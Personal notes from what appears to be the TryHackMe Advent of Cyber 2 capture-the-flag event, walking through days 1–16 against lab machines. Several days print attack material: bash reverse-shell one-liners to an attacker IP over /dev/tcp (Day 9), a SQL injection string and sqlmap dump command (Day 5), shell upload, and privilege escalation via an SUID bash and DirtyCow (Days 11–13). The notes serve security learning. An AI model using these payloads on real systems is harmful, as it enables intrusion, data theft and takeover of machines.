httpstryhackme.comroomadventofcyber2

```
 After last year's shenanigans where Elf McElferson and Elf McSkidy were on damage control mode the entirety of December, McSkidy vowed to never let that happen again. The previous Christmas period was extremely stressful with the Christmas Monster managing to compromise every system within Santa's corporate infrastructure to prevent Christmas from happening. Is Christmas still in danger this year?

McSkidy showed great promise with the previous incident and was tasked with building up a security team within Santa's company - *The Best Festival Company*. Due to resistance from management, budgeting and bureaucracy issues, McSkidy was only able to start building out her team from the 8th November. Since then, she's only hired 2 team members - one security specialist Elf McHacker and one intern Elf McEager.

It's the evening of 30th November - McSkidy's team has been working hard to prevent any down time and security incidents within the entire network and application stack of the Best Festival Company. McHacker suggested installing a VPN and only allowing access to the infrastructure via the VPN. After a long 8 hour installation and deployment, McSkidy opens her monitoring dashboard and notices that no traffic is flowing to any of the applications (this was expected as no one had access to the VPN). *thank god,* she said. *Getting hacked again is not an option.*

*RING, RING, RING* - her Elf hotline starts ringing and she jumps. *Santa's schedule isn't working - I CAN'T SEE ANYTHING,* yells Elf McAssistant. Within a matter of seconds hundreds of phone calls come in and *Elf McSkidy gets that sinking feeling in her stomach.* She quickly dispatches *McHacker* to analyse the VPN logs. He notices a payload that resembles a VPN authentication bypass that allows anyone to bypass the VPN - *did someone install the wrong version.* With the poor state of security across the entire network, this unknown actor managed to access all applications and their underlying servers!

Unlike last time, no one has claimed responsibility for this incident. *Here we go again*, she sighs. It's up to you (Elf McEager) and the rest to save Christmas.
```

# Day 1
`export IP=10.10.31.26`

- Decrypting the auth cookie using https://gchq.github.io/CyberChef/
- Modifying the value and encrypting it again
- Replace the cookie and refresh to gain access

# Day 2
`export IP=10.10.252.178`

- Discovering folders using gobuster, found http://10.10.43.10/uploads/
- Figuring out what file types to use to avoid the extension filter
- Upload the reverse shell
- Run netcat to start listening on the port defined in the revshell script
- Open the revshell which we uploaded
- Did not take the time to figure out how to stabilize the shell, just used `find` to find the flag.txt

# Day 3

`export IP=10.10.109.129`

- Used ZAP to brute force try different usernames and passwords.

# Day 4

`export IP=10.10.138.12`

Date format is `YYYYMMDD`

- Compose the wfuzz command according to the example
- Run gobuster searching for php files as well using `-x "php"`
- Use wfuzz and the provided wordlist to find the correct date for which the api returns the key.

# Day 5

`export IP=10.10.159.207`

```
Look at alternative database systems that are better than sqlite. Also, don't forget that you installed a Web Application Firewall (WAF) after last year's attack. In case you've forgotten the command, you can tell SQLMap to try and bypass the WAF by using --tamper=space2comment
```

santa:santapassword
john:johnstrong

- Took me a long while to discover that I should check port 8000 and not the demo on port 3000
- Gifts where easy to query using an `a' or 1-=1; -- ` injection
- same with the admin password using a union select on the `users`. 
- Getting the flag took me a really long time since sqlmap did not give me usefull feedback on my mistakes. In the end I had not realized that the dbms should have been sqlite...

sqlmap --url http://10.10.159.207:8000/santapanel?search=abc --method=GET --dbms sqlite --cookie "session=eyJhdXRoIjp0cnVlfQ.X8wDtw.8s8ipE8tFqPzPxWcT9HngM24Ij8" --dump

# Day 6

`export IP=10.10.197.95`
`http://10.10.197.95:5000`

- Basic XSS, no flag to be found, boring day :(

# Day 7

Another basic day, just getting a bit familiar with filtering in Wireshark. Useful but it remains way too basic.

- Had some trouble saving the application/zip response as binary data because Wireshark kept hanging. Probably just my tiny laptop unable to handle it, took some waiting before it succeeded.

# Day 8

`export IP=10.10.73.122`

I'm beginning to think that only the first 2 days were actually CTF challenges, the rest so far is just learning. Which is good, but a tad boring. This day it's just running nmap a couple of times. `nmap -sV -sC --script=vuln $IP`.

#Day 9

`export IP=10.10.250.178`

- Login to the ftp as anonymous
- get the backup.sh script and modify it by placing reverse shell code in it from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp

```sh
bash -i >& /dev/tcp/10.8.97.41/4242 0>&1
0<&196;exec 196<>/dev/tcp/10.8.97.41/4242; sh <&196 >&196 2>&196
```

# Day 10

`export IP=10.10.74.114`

- Using `enum4linux` to get info about samba shares

### Samba shares and users
Sharename       Type      Comment
---------       ----      -------
tbfc-hr         Disk      tbfc-hr
tbfc-it         Disk      tbfc-it
tbfc-santa      Disk      tbfc-santa

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: elfmcskidy	Name: 	Desc: 
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elfmceager	Name: elfmceager	Desc: 
index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: elfmcelferson	Name: 	Desc: 

user:[elfmcskidy] rid:[0x3e8]
user:[elfmceager] rid:[0x3ea]
user:[elfmcelferson] rid:[0x3e9]

# Day 11

`export IP=10.10.138.120`

- Start with a network scan `nmap -sV -sC --script=vuln $IP`
- Download linpeas.sh and host in on a webserver on the attacking machine `python3 -m http.server 8080` (the vulnerable machine does not have internet access)
- Download linpeas.sh on the vuln machine in /tmp `wget http://10.8.97.41:8080/linpeas.sh`
- Instead of linpeas, to just find SUID files you can use `find / -perm -u=s -type f 2>/dev/null`
- Stumbled a bit with what I could actually do with /bin/bash that had the SUID bit set, turned out I had to include the -p switch to turn on privileged mode, so `/bin/bash -p`.

# Day 12

`export IP=10.10.135.29`

- First run an nmap to see which ports are open.
- Start metasploit and create a new `workspace -a day12`.
- `use auxiliary/scanner/portscan/tcp`
- Run a scan using `db_nmap -sV -Pn -A -p 3389,8009,8080 10.10.135.29`
- After searching for the right cve and using that in metasploit we have to configure the options. Took a long time to discover that I should use the /cgi-bin/elfwhacker.bat that was desribed in the descrption...

# Day 13

`export IP=10.10.50.92`

- Perform an nmap scan and connect to the discovered telnet server.
- Use pty to stabilize shell
`python -c 'import pty; pty.spawn("/bin/bash")'`
- Download original dirtyCow: https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c, host it on a python webserver and download it on the victim machine.
- Compile and run it on the machine and switch to the created user `su firefart`.
- Check the /root directory and follow the instructions left there.

### Found info
```c
const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "grinch";
```

# Day 14

Reddit user `IGuidetheClaus2020`

http://exif.regex.info/exif.cgi

# Day 15

Simple python tutorial

# Day 16

`export IP=10.10.86.147`

http://10.10.86.147:8000/static/index.html

- The text made it sound like you only had 1-2 attempts, in the end I just tested my luck and succesfully ran it for all the odd numbers 1-99...
